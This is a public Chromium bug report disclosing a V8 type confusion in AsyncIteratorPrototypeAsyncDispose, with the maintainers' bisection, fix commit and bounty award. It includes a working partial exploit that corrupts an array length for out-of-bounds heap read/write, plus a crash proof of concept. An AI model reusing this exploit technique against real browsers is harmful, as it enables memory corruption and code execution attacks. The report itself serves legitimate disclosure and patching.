# Type Confusion in AsyncIteratorPrototypeAsyncDispose() Leads to RCE

| Field | Value |
|-------|-------|
| **Issue ID** | [380677637](https://issues.chromium.org/issues/380677637) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | hu...@gmail.com |
| **Assignee** | re...@chromium.org |
| **Created** | 2024-11-25 |
| **Bounty** | $50,000.00 |

## Description

Security Bug

Important: Please do not change the component of this bug manually.

Please READ THIS FAQ before filing a bug: <https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md>

Please see the following link for instructions on filing security bugs: <https://www.chromium.org/Home/chromium-security/reporting-security-bugs>

Reports may be eligible for reward payments under the Chrome VRP: <https://g.co/chrome/vrp>

NOTE: Security bugs are normally made public once a fix has been widely deployed.

---

VULNERABILITY DETAILS

## Cause of the vulnerability

I will explain what happened in the POC.
The vulnerability is located in the `AsyncIteratorPrototypeAsyncDispose()` method, Please refer to the comments for the specific process.

```
transitioning javascript builtin AsyncIteratorPrototypeAsyncDispose(
    js-implicit context: Context, receiver: JSAny)(): JSAny {
  // JSPromise object that is returned by this method
  const capability = promise::NewJSPromise();

  try {
    try {
      // Get the "return" method on the async iterator
      const returnMethod = GetMethod(receiver, kReturnString) otherwise IfUndefined;
      // Call the "return" method on the async iterator object, which returns a JSPromise object
      const result = Call(context, returnMethod, receiver, Undefined);

      // Get the Promise method in the native context
      const promiseFun = *NativeContextSlot(ContextSlot::PROMISE_FUNCTION_INDEX);

      // Get the constructor that creates a new Promise object
      // Since Promise[Symbol.species] is set to MyConstructor in the POC
      // Therefore, the constructor obtained here is MyConstructor
      const constructor = SpeciesConstructor(capability, promiseFun);

      // Call Promise.resolve(result) to create a JSPromise object that wraps the result of the return() method
      // Note: Here the constructor is our custom MyConstructor
      // So PromiseResolve() will create the object to be returned using MyConstructor as the constructor
      // Therefore, resultWrapper is actually the fake_promise object in the POC
      const resultWrapper = promise::PromiseResolve(constructor, result);

      // handler for the then method
      const resolveContext = ...;
      const onFulfilled = AllocateRootFunctionWithContext(
          kAsyncIteratorPrototypeAsyncDisposeResolveClosureSharedFun,
          resolveContext, %RawDownCast<NativeContext>(context));

      // Execute the .then method on resultWrapper
      promise::PerformPromiseThenImpl(
          // Here it tries to convert the JSObject type fake_promise to JSPromise, causing a crash
          UnsafeCast<JSPromise>(resultWrapper),  
          onFulfilled,    // onResolve
          UndefinedConstant(),   // onReject
          capability    // Promise object returned when the then() method is completed
        );
    } label IfUndefined {
      ...
    }

    // 7. Return promiseCapability.[[Promise]].
    return capability;
  } catch (e, _message) {
    ...
  }
}

```

In the POC, `Promise[Symbol.species]` is set to `MyConstructor`, so `PromiseResolve()` will return the `fake_promise` object from the POC. This object is of the `JSObject` type and cannot be safely forced to convert to the `JSPromise` type, which leads to the vulnerability.

## Exploit

This vulnerability allows us to obfuscate `resultWrapper` as an object of the `JSPromise` type.
The definition of `JSPromise` is as follows:

```
bitfield struct JSPromiseFlags extends uint31 {  
  // Promise status: kPending/kFulfilled/kRejected
  status: PromiseState: 2 bit;  
  has_handler: bool: 1 bit;   
  is_silent: bool: 1 bit;
  async_task_id: uint32: 27 bit;
}

extern class JSObjectWithEmbedderSlots extends JSObject {}

// |   map       | properties          |  
// | elements    | reactions_or_result |
// | flags       |
extern class JSPromise extends JSObjectWithEmbedderSlots {

  // Smi 0 terminated list of PromiseReaction objects in case the JSPromise was
  // not settled yet, otherwise the result.
  reactions_or_result: Zero|PromiseReaction|JSAny;
  flags: SmiTagged<JSPromiseFlags>;
}

```

Compared to `JSObject`, this type adds two fields:

- `reactions_or_result`: offset `+0xc`
  - If the promise is in a settled state, this field is used to store the result value.
  - If the promise is in a pending state, this field is a head pointer to a linked list, pointing to a linked list composed of `PromiseReactions` objects.
- `flags`: offset `+0x10`, SMI type, the lowest 2 bits are used to represent the promise's state:
  - `0`: pending
  - `1`: resolved
  - `2`: rejected

Subsequently, the `resultWrapper` object will enter the `PerformPromiseThenImpl()` method for processing. This method will handle differently depending on the state of `promise`. We pay attention to the handling of the `Pending` state:

- `NewPromiseReaction()` will first create a new `PromiseReaction` object and record the callback handler in this object.
- Then the linked list insertion is performed: the pointer of the `PromiseReaction` object is written into `promise.reactions_or_result`.

```
@export
transitioning macro PerformPromiseThenImpl(
    implicit context: Context)(
    promise: JSPromise,    // The objects we can forge
    onFulfilled: Callable|Undefined,    
    onRejected: Callable|Undefined,  
    resultPromiseOrCapability: JSPromise|PromiseCapability|Undefined 
  ): void {
  if (promise.Status() == PromiseState::kPending) {
    const promiseReactions =
        UnsafeCast<(Zero | PromiseReaction)>(promise.reactions_or_result);

    const reaction = NewPromiseReaction(
        promiseReactions, resultPromiseOrCapability, onFulfilled, onRejected);
    promise.reactions_or_result = reaction;    // <=== Here
  } else {    // promise is settled
    ...
  }
  promise.SetHasHandler();
}

```

The above operation gives us a powerful primitive.

If `MyConstructor` returns `[1.1]`, then `resultWrapper` points to a `JSArray` object, which is followed closely by a `FixedDoubleArray` object. At this time:

- `JSArray::length` will be treated as the `JSPromise::reactions_or_result` field.
- `FixedDoubleArray::map` will be treated as the `JSPromise::flags` field.

```
                        +------------+------------+
             JSArray => |    map     | properties |
                        +------------+------------+ 
                        |  elemetns  |   length   |
                        +------------+------------+
    FixedDoubleArray => |    map     |   length   |
                        +------------+------------+
                        |        values[0]        |
                        +-------------------------+

                        +------------+------------+
           JSPromise => |    map     | properties |
                        +------------+------------+ 
                        |  elemetns  | reactions..|
                        +------------+------------+
                        |   flags    |
                        +------------+

```

The processing procedure of `PerformPromiseThenImpl()` is as follows:

- Get the promise status
  
  - This will read the `JSPromise::flags` field, corresponding to `FixedDoubleArray::map`. `FixedDoubleArray::map` is the constant `0x00000879`.
  - `(0x00000879>>1)&3 = 0`, thus the promise is considered to be in the `pending` state.
- Create a new `PromiseReaction` object.
- Write the `PromiseReactions` pointer into the `JSPromise::reactions_or_result` field.
  
  - What is actually written here is the `JSArray::length` field, causing the `JSArray`'s `length` to be unusually large, thereby achieving arbitrary out-of-bounds read/write on the v8 heap.

A partial exploit is as follows, this exploit allows us to obtain the ability to perform arbitrary out-of-bounds read/write on the v8 heap, which is enough to prove that this vulnerability is exploitable.

```
// Get an asynchronous iterator object
async function* generator() {
    yield 1;
}
const gen = generator();   

/* 
    heap spray, The heap layout of corrupted_arr is as follows
                        +------------+------------+
             JSArray => |    map     | properties |
                        +------------+------------+ 
                        |  elemetns  |   length   |
                        +------------+------------+
    FixedDoubleArray => |    map     |   length   |
                        +------------+------------+
                        |        values[0]        |
                        +-------------------------+
*/
let heap_spray = [];
for(let i=0; i<50; i++) {
    heap_spray.push([1.1]);
}
let corrupted_arr = heap_spray[10];

function MyConstructor(executor) {
    function myResolve(value) {
        ;
    }
    function myReject(err) {
        ;
    }
    executor(myResolve, myReject);

    /*
        In AsyncIteratorPrototypeAsyncDispose()
            1. The returned corrupted_arr here will be treated as the return value of promise::PromiseResolve(constructor, result);
            2. Then it is forcibly converted to a JSPromise object through UnsafeCast<JSPromise>(resultWrapper)
            3. Enter the PerformPromiseThenImpl() method to execute resultWrapper.then(...)
    */
    return corrupted_arr;
}

// When a Promise object needs to be derived (for example, in the then method), 
// MyConstructor will be used as the construction method to create objects
Object.defineProperty(Promise, Symbol.species, {
    "value": MyConstructor
});

/*
    Trigger AsyncIteratorPrototypeAsyncDispose
    During processing, this method will confuse corrupted_arr as a JSPromise object
*/
gen[Symbol.asyncDispose]();

// job(corrupted_arr)->length has been corrupted to the pointer of the PromiseReaction object
// Unusually large, can freely implement out-of-bounds read and write
print(corrupted_arr[123]);


```
## Repair Suggestions

`PerformPromiseThenImpl()` can only be used when `resultWrapper` is a `JSPromise` object.

We should use `IsPromiseSpeciesProtectorCellInvalid()` to determine whether the `Promise[Symbol.species]` property has been set.

- If it is not set: Then the `constructor` passed into `PromiseResolve(constructor, ...)` is the `Promise` method in `NativeContext`, and the returned `resultWrapper` is a `JSPromise` object. We can safely call the `PerformPromiseThenImpl()` method.
- If it is set: Then the `constructor` passed into `PromiseResolve(constructor, ...)` is custom-defined in JavaScript. We cannot make assumptions about the type of `resultWrapper`. At this time, we should enter the slow path: get the `then()` method on the `resultWrapper` object and call it.

VERSION

This vulnerability was introduced in this commit of V8: `785b00ee5b0e355edb4e9264b160eb512a845bef`.

REPRODUCTION CASE

POC:

```
// generate an asynchronous iterator object
async function* generator() {
}
const resource = generator();   

// This object will be treated as a JSPromise object
let fake_promise = {  
    a: 123,    // This field will be treated as reactions_or_result
    b: 0x1,   // This field will be treated as flags
};

function MyConstructor(executor) {
    function empty_callback() {
    }
    executor(empty_callback, empty_callback);

    // The return value will be treated as a JSPromise object 
    // by AsyncIteratorPrototypeAsyncDispose
    return fake_promise;
}

// When Promise.then() needs to create a new Promise object, 
// MyConstructor will be used as the constructor method to create the object.
Object.defineProperty(Promise, Symbol.species, {
    "value": MyConstructor
});

// Trigger AsyncIteratorPrototypeAsyncDispose()
resource[Symbol.asyncDispose]();

```

In the debug build of d8, add the `--js-explicit-resource-management` flag, then execute `poc.js`.

```
./d8 \
    --js-explicit-resource-management \
    ./poc.js 

```

This will result in a crash:

```
abort: CSA_DCHECK failed: Torque assert 'Is<A>(o)' failed [src/builtins/cast.tq:846] [../../src/builtins/iterator.tq:367]
...

```

CREDIT INFORMATION

Reporter credit: 303f06e3

## Timeline

### fl...@google.com (2024-11-25)

Thanks so much for the very detailed report.

It looks like you forgot to attach poc.js. Any chance you could upload that for us to take a look? Thanks!

### cl...@appspot.gserviceaccount.com (2024-11-25)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5573034584768512.

### 24...@project.gserviceaccount.com (2024-11-25)

ClusterFuzz testcase 5573034584768512 appears to be flaky, updating reproducibility hotlist.

### 24...@project.gserviceaccount.com (2024-11-25)

Detailed Report: https://clusterfuzz.com/testcase?key=5573034584768512

Fuzzer: None
Job Type: linux_asan_d8
Crash Type: 
Crash Address: 
Crash State:
  
Sanitizer: address (ASAN)

Crash Revision: https://clusterfuzz.com/revisions?job=linux_asan_d8&revision=0

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5573034584768512

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary. 

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


************************* UNREPRODUCIBLE *************************
Note: This crash might not be reproducible with the provided testcase. That said, for the past 14 days, we've been seeing this crash frequently.

It may be possible to reproduce by trying the following options:
- Run testcase multiple times for a longer duration.
- Run fuzzing without testcase argument to hit the same crash signature.

If it still does not reproduce, try a speculative fix based on the crash stacktrace and verify if it works by looking at the crash statistics in the report. We will auto-close the bug if the crash is not seen for 14 days.
******************************************************************

### fl...@google.com (2024-11-25)

Disregard Clusterfuzz here; it's acting buggy to day. I'm able to replicate this on my own debug build.

Assigning provisional severity/FoundIn and assigning to V8 oncall.

### cl...@chromium.org (2024-11-26)

I can also reproduce this. Bisecting locally.

### cl...@chromium.org (2024-11-26)

Bisects to:

```
785b00ee5b0e355edb4e9264b160eb512a845bef is the first bad commit
commit 785b00ee5b0e355edb4e9264b160eb512a845bef
Author: Rezvan Mahdavi Hezaveh <rezvan@chromium.org>
Date:   Wed Oct 23 23:13:03 2024 +0000

    [explicit-resource-management] Add missed dispose symbols
    
    This CL adds `Symbol.dispose` as a property to the `DisposableStack`
    and %IteratorPrototype%, and adds `Symbol.asyncDispose` to
    `AsyncDisposableStack` and %AsyncIteratorPrototype%.
    
    Bug: 42203506, 42203814
    
    Change-Id: Ib9be87978b2413a55c7f135504dacd4ba675d320
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5900537
    Commit-Queue: Rezvan Mahdavi Hezaveh <rezvan@chromium.org>
    Reviewed-by: Shu-yu Guo <syg@chromium.org>
    Cr-Commit-Position: refs/heads/main@{#96815}

```

### cl...@chromium.org (2024-11-26)

This looks like no security impact to me, since it requires `--js-explicit-resource-management`. Please confirm, and I will set that label.

### 24...@project.gserviceaccount.com (2024-11-26)

ClusterFuzz testcase 5573034584768512 appears to be flaky, updating reproducibility hotlist.

### pe...@google.com (2024-11-26)

Setting milestone because of s0/s1 severity.

### pe...@google.com (2024-11-26)

Setting Priority to P1 to match Severity s1. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### re...@chromium.org (2024-11-26)

clemensb@, that is right. This feature is still behind the flag.

### cl...@chromium.org (2024-11-26)

This is still an RCE, right? Just not enabled by default.
Resetting severity but setting impact to none.

### re...@chromium.org (2024-11-26)

Right, thanks!

### ap...@google.com (2024-11-27)

Project: v8/v8  

Branch: main  

Author: Rezvan Mahdavi Hezaveh <[rezvan@chromium.org](mailto:rezvan@chromium.org)>  

Link:      <https://chromium-review.googlesource.com/6052803>

[explicit-resource-management] Use built-in promise constructor

---


Expand for full commit details
```
[explicit-resource-management] Use built-in promise constructor 
 
This CL removes the incorrect usage of Symbol.species and 
passes the built-in promise constructor to PromiseResolve. 
 
Bug: 380677637 
Change-Id: I2373041e22e39309cbdfa030e2b9c42a9cc0eedf 
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6052803 
Reviewed-by: Shu-yu Guo <syg@chromium.org> 
Commit-Queue: Rezvan Mahdavi Hezaveh <rezvan@chromium.org> 
Cr-Commit-Position: refs/heads/main@{#97429}

```

---

Files:

- M `src/builtins/iterator.tq`
- A `test/mjsunit/harmony/regress/regress-380677637.js`

---

Hash: 4f9beed00e2f8f6feefb59f481c5f114732c8443  

Date:  Tue Nov 26 23:45:12 2024


---

### sp...@google.com (2024-11-28)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $50000.00 for this report.

Rationale for this decision:
high quality report of demonstrated arbitrary write in a sandboxed process / the renderer 


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### am...@chromium.org (2024-11-28)

Congratulations 303f06e3! Thank you for your efforts and reporting this issue to us -- great work!

### ch...@google.com (2025-03-06)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/380677637)*
